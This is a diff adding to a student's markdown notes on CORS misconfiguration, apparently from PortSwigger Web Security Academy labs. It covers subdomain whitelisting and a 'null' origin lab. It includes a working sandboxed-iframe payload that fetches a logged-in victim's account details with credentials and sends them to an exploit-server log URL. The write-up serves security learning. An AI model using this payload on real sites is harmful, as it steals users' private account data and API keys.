@@ -49,3 +49,33 @@ so here the server is configured such that it is reflecting the request origin w
 ```
 when this script is run the ```administrator``` browser the request will be sent to the server for his accountDetails and that response will be forwarded to attacker in a form of a request and the data from the server in the parameter value.
 
+
+### Whitlisting 
+a list that contains all the domains and subdomains that are allowed to access the resource. 
+
+in this sometimes access will be given to all the subdomains of a domain which makes it vulnerable because the attacker can create his own
+subdomain for the domain that is allowed and can gain access to the resource that is getting shared.
+
+
+### Lab 2
+
+this lab allows whitelist with value **NULL**.
+
+using js we cannot send the origin header or other header values.
+
+iframe will make the browser to set the Origin value to null while make the Origin of the request to Null(Origin: null).
+
+```
+<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = function() {
+            parent.location = 'https://exploit-0aa400c204a7b5d381b5f192012a0098.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
+        };
+        req.open('GET', 'https://0a7a00c804e9b5138117f25100e600d7.web-security-academy.net/accountDetails', true);
+        req.withCredentials = true; 
+        req.send();
+    </script>
+"></iframe>
+```
+sandbox = allow-scripts ::: allows iframe to run js.
